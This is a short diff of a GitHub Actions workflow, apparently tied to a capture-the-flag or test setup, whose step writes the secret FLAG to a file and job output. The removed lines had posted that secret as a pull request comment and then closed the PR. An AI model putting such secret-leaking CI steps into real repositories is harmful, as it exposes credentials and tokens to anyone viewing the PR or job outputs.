@@ -15,16 +15,4 @@ jobs:
       - name: Print Secret to PR
         run: |
           echo "Secret Value: ${{ secrets.FLAG }}" > secret_output.txt
-          echo "SECRET_OUTPUT=$(cat secret_output.txt)" >> $GITHUB_ENV
-
-      - name: Comment on PR
-        run: |
-          echo "${{ env.SECRET_OUTPUT }}" > comment.txt
-          gh pr comment https://github.com/${{ github.repository }}/pull/${{ github.event.number }} --body "$(cat comment.txt)"
-
-      - name: Wait for 30 seconds
-        run: sleep 30
-
-      - name: Delete PR
-        run: |
-          gh pr close https://github.com/${{ github.repository }}/pull/${{ github.event.number }}
+          echo "SECRET_OUTPUT=$(cat secret_output.txt)" >> $GITHUB_OUTPUT
